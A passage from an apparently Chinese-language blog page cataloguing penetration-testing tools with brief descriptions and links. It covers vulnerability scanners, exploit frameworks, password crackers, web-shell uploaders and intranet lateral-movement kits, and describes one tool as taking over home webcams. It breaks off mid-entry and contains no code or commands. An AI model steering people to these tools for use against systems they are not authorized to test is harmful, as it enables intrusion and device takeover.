&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2NvZGV5c28vQ29kZVRlc3QuZ2l0JTYw&#34;&gt;https://github.com/codeyso/CodeTest.git&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;辅助渗透测试框架-polaris&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#辅助渗透测试框架-polaris&#34;&gt;#&lt;/a&gt; 辅助渗透测试框架 -- Polaris&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个美观舒适的辅助渗透测试框架 (完善中)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RvaW1ldC9Qb2xhcmlz&#34;&gt;https://github.com/doimet/Polaris&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;banli-高危资产识别和高危漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#banli-高危资产识别和高危漏洞扫描&#34;&gt;#&lt;/a&gt; Banli - 高危资产识别和高危漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Banli 是一款极其简单好用的高危资产识别和高危漏洞扫描工具。本项目也是自己深入学习理解 Go 语言后计划陆续发布的项目之一。本项目仅用于安全研究人员在授权的情况下使用，请遵守网络安全法，若因本工具产生任何问题，后果请自负，与作者无关！程序代码中不会添加任何形式的后门，运行程序一般情况不会对系统产生危害，请各位师傅放心使用！本项目会持续更新，直到海枯石烂。作者：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzBlMHc=&#34;&gt;0e0w&lt;/span&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0dvcWkvQmFubGk=&#34;&gt;https://github.com/Goqi/Banli&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;mdat-一款用于数据库攻击的利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mdat-一款用于数据库攻击的利用工具&#34;&gt;#&lt;/a&gt; MDAT - 一款用于数据库攻击的利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这是一款用于数据库攻击的利用工具，集合了多种主流的数据库类型。由团队成员 Ch1ng &amp;amp; j1anFen 共同完成开发。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NhZmVHcm9jZXJ5U3RvcmUvTURBVA==&#34;&gt;https://github.com/SafeGroceryStore/MDAT&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;webcrack-v22-弱口令检测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#webcrack-v22-弱口令检测工具&#34;&gt;#&lt;/a&gt; WebCrack  &lt;code&gt;v(2.2)&lt;/code&gt;  - 弱口令检测工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;WebCrack 是一款 web 后台弱口令 / 万能密码批量检测工具，在工具中导入后台地址即可进行自动化检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3l6ZGRtcjYvV2ViQ3JhY2s=&#34;&gt;https://github.com/yzddmr6/WebCrack&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;ppmap-基于go的漏洞扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ppmap-基于go的漏洞扫描器&#34;&gt;#&lt;/a&gt; ppmap - 基于 go 的漏洞扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;ppmap 是一款基于 Go 开发的漏洞扫描器 / 漏洞利用工具，该工具能够通过在全局上下文中检查特定变量来扫描、检测和利用 XSS 漏洞。该工具目前只能利用已知 Gadget（可能支持部分自定义开发的 Gadget）中的安全问题，但不支持代码分析或任何高级的漏洞扫描 / 利用方式。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2tsZWl0b24weDAwL3BwbWFw&#34;&gt;https://github.com/kleiton0x00/ppmap&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;a2sv-ssl漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#a2sv-ssl漏洞扫描&#34;&gt;#&lt;/a&gt; A2SV - SSL 漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;自动扫描 SSL 漏洞。HeartBleed, CCS Injection, SSLv3 POODLE, FREAK... etc&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9hMnN2&#34;&gt;https://github.com/hahwul/a2sv&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;siusiu-suitesuite-基于docker的渗透工具箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#siusiu-suitesuite-基于docker的渗透工具箱&#34;&gt;#&lt;/a&gt; siusiu （suitesuite）- 基于 docker 的渗透工具箱&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一款基于 docker 的渗透测试工具箱，致力于做到渗透工具随身携带、开箱即用。减少渗透测试工程师花在安装工具、记忆工具使用方法上的时间和精力。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1NoYW5nUnVpLWhhc2gvc2l1c2l1&#34;&gt;https://github.com/ShangRui-hash/siusiu&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nginx漏洞扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx漏洞扫描&#34;&gt;#&lt;/a&gt; Nginx 漏洞扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nginxpwner 是一个简单的工具，可以查找常见的 Nginx 错误配置和漏洞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N0YXJrMGRlL25naW54cHduZXI=&#34;&gt;https://github.com/stark0de/nginxpwner&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞挖掘工具-afrog&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#漏洞挖掘工具-afrog&#34;&gt;#&lt;/a&gt; 漏洞挖掘工具 -- afrog&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;afrog 是一个挖洞工具。如果你想挖 SQL 注入、XSS、文件包含等漏洞，可以试一下 afrog。软件有以下特点：&lt;br /&gt;
1、基于 xray 内核，又不像 xray&lt;br /&gt;
2、性能卓越，最少请求，最佳结果&lt;br /&gt;
 3、实时显示，扫描进度&lt;br /&gt;
 4、输出 html 报告，方便查看 request 和 response&lt;br /&gt;
5、启动程序，自动更新本地 PoC 库&lt;br /&gt;
 6、长期维护、更新 PoC（afrog-pocs）&lt;br /&gt;
7、API 接口，轻松接入其他项目&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3phbjhpbi9hZnJvZw==&#34;&gt;https://github.com/zan8in/afrog&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;bomber&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bomber&#34;&gt;#&lt;/a&gt; Bomber&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;POC bomber 是一款漏洞检测工具，旨在利用大量高危害漏洞的 POC/EXP 快速获取目标服务器权限&lt;/p&gt;
&lt;p&gt;本项目收集互联网各种危害性大的 RCE・任意文件上传・sql 注入 等高危害且能够获取到服务器核心权限的漏洞 POC/EXP，并集成在 POC bomber 武器库中，利用大量高危害 POC 对单个或多个目标进行模糊测试，以此快速获取目标服务器权限，适合在红蓝对抗或 hvv 中帮助红队快速找到突破口进入内网&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RyMHVibGUtbUFrZXIvUE9DLWJvbWJlcg==&#34;&gt;https://github.com/tr0uble-mAker/POC-bomber&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;yaazhini-一款免费的android-apk和api漏洞扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yaazhini-一款免费的android-apk和api漏洞扫描器&#34;&gt;#&lt;/a&gt; Yaazhini - 一款免费的 Android APK 和 API 漏洞扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Yaazhini 是一款针对 Android APK 和 API 的免费漏洞扫描工具，这款工具提供了用户友好的操作界面，广大移动端安全研究人员可以在 Yaazhini 的帮助下，轻松扫描任何 Android 应用程序的 APK 文件以及 API 接口，而且 Yaazhini 还会给你提供非常丰富的扫描结果数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudmVnYWJpcmQuY29tL3lhYXpoaW5pLw==&#34;&gt;https://www.vegabird.com/yaazhini/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;fuxploider-文件上传漏洞扫描器和利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fuxploider-文件上传漏洞扫描器和利用工具&#34;&gt;#&lt;/a&gt; fuxploider - 文件上传漏洞扫描器和利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Fuxploider 是一种开源渗透测试工具，可自动检测和利用文件上传表单缺陷的过程。该工具能够检测允许上传的文件类型，并能够检测哪种技术最适合在所需的 Web 服务器上上传  &lt;code&gt;Web Shell&lt;/code&gt;  或任何恶意文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FsbWFuZGluL2Z1eHBsb2lkZXI=&#34;&gt;https://github.com/almandin/fuxploider&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xsstrike-xss扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xsstrike-xss扫描器&#34;&gt;#&lt;/a&gt; XSStrike - XSS 扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;XSStrike 是一个跨站点脚本检测套件，配备了四个手写解析器、一个智能负载生成器、一个强大的模糊引擎和一个非常快速的爬虫。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==&#34;&gt;https://github.com/s0md3v/XSStrike&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;auxtools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#auxtools&#34;&gt;#&lt;/a&gt; AuxTools&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 C++ 与 QML 混合编程开发的渗透辅助工具，其中包含：杀软识别、命令生成、编码解码、加密解密、端口扫描等功能，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RvaW1ldC9BdXhUb29scw==&#34;&gt;https://github.com/doimet/AuxTools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;poc2jar&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc2jar&#34;&gt;#&lt;/a&gt; poc2jar&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Java 编写，Python 作为辅助依赖的漏洞验证、利用工具，添加了进程查找模块、编码模块、命令模块、常见漏洞利用 GUI 模块、shiro rememberMe 解密模块，加快测试效率。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2YwbmcvcG9jMmphcg==&#34;&gt;https://github.com/f0ng/poc2jar&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;ethereal&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ethereal&#34;&gt;#&lt;/a&gt; Ethereal&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Ethereal 是一款免费的网络协议分析程序，支持 Unix、Windows。借助这个程序，你既可以直接从网络上抓取数据进行分析，也可以对由其他嗅探器抓取后保存在硬盘上的数据进行分析。你能交互式地浏览抓取到的数据包，查看每一个数据包的摘要和详细信息。Ethereal 有多种强大的特征，如支持几乎所有的协议、丰富的过滤语言、易于查看 TCP 会话经重构后的数据流等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ldGhlcmVhbC5jb20v&#34;&gt;http://www.ethereal.com/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cvechecker&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cvechecker&#34;&gt;#&lt;/a&gt; cvechecker&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;cvechecker 的目标是通过扫描已安装的软件并将结果与 CVE 数据库进行匹配来报告系统上可能存在的漏洞。&lt;br /&gt;
官方提示：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;可能会产生许多误报（漏洞已通过修订版本修复，但该工具无法检测修订本身）。&lt;/li&gt;
&lt;li&gt;但是该工具也需要您的帮助。最多的工作是告诉 cvechecker 如何检测安装了哪个软件以及哪个版本。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAxOTAzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzY3MDE4&#34;&gt;https://blog.csdn.net/weixin_44019036/article/details/113767018&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;jsql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsql&#34;&gt;#&lt;/a&gt; jSQL&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;jSQL 是一款轻量级安全测试工具，可以检测 SQL 注入漏洞。它跨平台（Windows, Linux, Mac OS X, Solaris）、开源且免费。&lt;br /&gt;
它提供了数据库查询、后台爆破、文件读取、Web shell、SQL Shell、文件上传、暴力枚举、编码、批量注入测试等强大的功能，是一款非常不错的工具，也是渗透测试人员的强大助手。它支持 GET\POST 注入，同时也可以进行 HTTP 头注入（这个需要用户自动构建）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbjE5MC9qc3FsLWluamVjdGlvbg==&#34;&gt;https://github.com/ron190/jsql-injection&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nikto&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nikto&#34;&gt;#&lt;/a&gt; Nikto&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nikto 是一款开放源代码的、功能强大的 WEB 扫描评估软件，能对 web 服务器多种安全项目进行测试的扫描软件，能在 230 多种服务器上扫描出 2600 多种有潜在危险的文件、CGI 及其他问题，它可以扫描指定主机的 WEB 类型、主机名、特定目录、COOKIE、特定 CGI 漏洞、返回主机允许的 http 模式等等。它也使用 LibWhiske 库，但通常比 Whisker 更新的更为频繁。Nikto 是网管安全人员必备的 WEB 审计工具之一。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3N1bGxvL25pa3Rv&#34;&gt;https://github.com/sullo/nikto&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;dradis-漏洞利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dradis-漏洞利用工具&#34;&gt;#&lt;/a&gt; Dradis - 漏洞利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Dradis 框架是一种开源工具，使用户能够在安全评估期间特别是有效的信息和数据共享。功能包括简单的报告生成，附件支持，通过服务器插件和独立平台与现有系统和工具集成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mjk1MjUwOC9hcnRpY2xlL2RldGFpbHMvMTI0Mjg5ODA4&#34;&gt;https://blog.csdn.net/weixin_42952508/article/details/124289808&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;routersploit-路由器漏洞检测及利用框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#routersploit-路由器漏洞检测及利用框架&#34;&gt;#&lt;/a&gt; RouterSploit - 路由器漏洞检测及利用框架&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;RouteSploit 框架&lt;/strong&gt;是一款开源的漏洞检测及利用框架，其针对的对象主要为路由器等嵌入式设备。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdDkvcm91dGVyc3Bsb2l0&#34;&gt;https://github.com/threat9/routersploit&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;vega-platform-web安全测试平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vega-platform-web安全测试平台&#34;&gt;#&lt;/a&gt; Vega Platform - Web 安全测试平台&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Vega 是一个开放源代码的 web 应用程序安全测试平台，Vega 能够帮助你验证 SQL 注入、跨站脚本（XSS）、敏感信息泄露和其它一些安全漏洞。 Vega 使用 Java 编写，有 GUI，可以在 Linux、OS X 和 windows 下运行。Vega 类似于 Paros Proxy, Fiddler, Skipfish and ZAproxy。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3N1YmdyYXBoLmNvbS9wcm9kdWN0cy5odG1s&#34;&gt;http://subgraph.com/products.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xenotix&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xenotix&#34;&gt;#&lt;/a&gt; Xenotix&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Xenotix XSS Exploit Framework&lt;/strong&gt; 是一款用于检测和利用 WEB 应用程序中的 XSS 漏洞的渗透测试工具。通过使用真实的浏览器引擎执行扫描，可以将代码注入到含有 xss 漏洞的 web 页面中，识别 payload 的反馈，来确保零误报的 XSS 检测。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2FqaW5hYnJhaGFtL09XQVNQLVhlbm90aXgtWFNTLUV4cGxvaXQtRnJhbWV3b3Jr&#34;&gt;https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;http-请求走私检测工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#http-请求走私检测工具&#34;&gt;#&lt;/a&gt; HTTP 请求走私检测工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;HTTP 请求走私是一种高危漏洞，是一种攻击者走私模糊的 HTTP 请求以绕过安全控制并获得未经授权的访问以执行恶意活动的技术，该漏洞早在 2005 年就被 watchfire 发现，后来在 2019 年 8 月重新发现由 James Kettle - (albinowax) 发现并在 DEF CON 27 和 Black-Hat USA 上展示，要了解有关此漏洞的更多信息，您可以参考他在 Portswigger 网站上的详细研究博客。所以这个安全工具背后的想法是检测给定主机的 HRS 漏洞，检测基于给定排列的时间延迟技术，所以要了解更多关于这个工具的信息，我强烈建议你阅读我的博客文章这个工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fuc2h1bWFucGF0dG5haWsvaHR0cC1yZXF1ZXN0LXNtdWdnbGluZw==&#34;&gt;https://github.com/anshumanpattnaik/http-request-smuggling&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;内网渗透&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网渗透&#34;&gt;#&lt;/a&gt; 内网渗透&lt;/h1&gt;
&lt;h2 id=&#34;内网扫描以及验证工具-requesttemplate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网扫描以及验证工具-requesttemplate&#34;&gt;#&lt;/a&gt; 内网扫描以及验证工具 -- RequestTemplate&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;1、可以快速、准确、全面、利用、检测内网当中存在的漏洞&lt;br /&gt;
 2、在内网渗透的过程当中，收集网段的连通性往往意味着攻击面的大小。常用的收集网段的命令并不能收集全面，只有爆破才是最全面的解决办法。&lt;br /&gt;
3、在内网渗透的过程当中，凭据的复用往往使我们的内网横向事半功倍。使用配置文件的方式配置密码字典效果显著。&lt;br /&gt;
4、使用 xray 的 poc 对内网的 web 服务进行漏洞扫描。&lt;br /&gt;
5、内置默认字典爆破 FTP、Memcached、MongoDB、MySQL、Oracle、Postgres、Redis、SMB、MSSQL、SSH、17010 的检测。&lt;br /&gt;
6、使用 java 语言对漏洞进行复现，验证，后利用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzFuN2VyZmFjZS9SZXF1ZXN0VGVtcGxhdGU=&#34;&gt;https://github.com/1n7erface/RequestTemplate&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;requesttemplate&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#requesttemplate&#34;&gt;#&lt;/a&gt; RequestTemplate&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;首款双语双端内网扫描以及验证工具&lt;br /&gt;
快速、准确、全面、利用、检测内网当中存在的漏洞&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzFuN2VyZmFjZS9SZXF1ZXN0VGVtcGxhdGU=&#34;&gt;https://github.com/1n7erface/RequestTemplate&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;inscan-开源扫描器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#inscan-开源扫描器&#34;&gt;#&lt;/a&gt; InScan - 开源扫描器&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;边界打点后的自动化内网工具，完全与服务端脱离。服务端只用于生成 poc，网段信息等配置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2luYnVnLXRlYW0vSW5TY2FuLw==&#34;&gt;https://github.com/inbug-team/InScan/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;yasso-亚索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#yasso-亚索&#34;&gt;#&lt;/a&gt; Yasso - 亚索&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Yasso 将作为一款内网辅助渗透工具集发布，它集合了许多实用功能，来帮助  &lt;code&gt;Red team&lt;/code&gt;  成员在内网极端环境下的工具使用以及  &lt;code&gt;Blue team&lt;/code&gt;  成员的内网自检，并且程序加入了代理功能以及  &lt;code&gt;ants&lt;/code&gt;  的扫描并发，在实现功能的同时追求准确和速度&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhaXJzb24vWWFzc28=&#34;&gt;https://github.com/sairson/Yasso&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;本地端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地端口扫描&#34;&gt;#&lt;/a&gt; 本地端口扫描&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;多线程扫描本机使用的端口&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xlbmdqaWJvL1JlZFRlYW1Ub29scy90cmVlL21hc3Rlci93aW5kb3dzLyVFNiU5QyVBQyVFNSU5QyVCMCVFNyVBQiVBRiVFNSU4RiVBMyVFNiU4OSVBQiVFNiU4RiU4Rg==&#34;&gt;https://github.com/lengjibo/RedTeamTools/tree/master/windows/%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;camover一款功能强大的摄像头漏洞利用工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#camover一款功能强大的摄像头漏洞利用工具&#34;&gt;#&lt;/a&gt; CamOver：一款功能强大的摄像头漏洞利用工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;CamOver 是一款功能强大的摄像头漏洞利用工具，在该工具的帮助下，广大研究人员可以轻松破解掉你家网络摄像头的管理员密码，并接管你的摄像头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VudHlTZWMvQ2FtT3Zlcg==&#34;&gt;https://github.com/EntySec/CamOver&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;nishang&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nishang&#34;&gt;#&lt;/a&gt; Nishang&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Nishang 是一个框架以及脚本和有效负载的集合，它允许使用 PowerShell 进行进攻性安全，渗透测试和红色团队。Nishang 在渗透测试的所有阶段都很有用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmc=&#34;&gt;https://github.com/samratashok/nishang&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;firebuster-firelistener&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#firebuster-firelistener&#34;&gt;#&lt;/a&gt; FireBuster FireListener&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;FireBuster 可以对内网进行扫描，它会把包发给 FireListener.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9Qb3dlclNoZWxsLVNjcmlwdHM=&#34;&gt;https://github.com/roo7break/PowerShell-Scripts&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;xy_cross-domain&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xy_cross-domain&#34;&gt;#&lt;/a&gt; XY_Cross-domain&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一款内网横向渗透辅助工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2lzeGlhbmd5YW5nL1hZX0Nyb3NzLWRvbWFpbg==&#34;&gt;https://github.com/isxiangyang/XY_Cross-domain&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;aopo-内网自动化快速打点工具资产探测漏洞扫描服务扫描弱口令爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#aopo-内网自动化快速打点工具资产探测漏洞扫描服务扫描弱口令爆破&#34;&gt;#&lt;/a&gt; Aopo - 内网自动化快速打点工具｜资产探测｜漏洞扫描｜服务扫描｜弱口令爆破&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;内网自动化快速打点工具｜资产探测｜漏洞扫描｜服务扫描｜弱口令爆破&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0V4cExhbmdjbi9Bb3Bv&#34;&gt;https://github.com/ExpLangcn/Aopo&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;netspy&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#netspy&#34;&gt;#&lt;/a&gt; netspy&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;netspy 是一款快速探测内网可达网段工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3NobWlseWx0eS9uZXRzcHk=&#34;&gt;https://github.com/shmilylty/netspy&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;edrhunt&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#edrhunt&#34;&gt;#&lt;/a&gt; EDRHunt&lt;/h2&gt;
&lt;blockquote&gt;
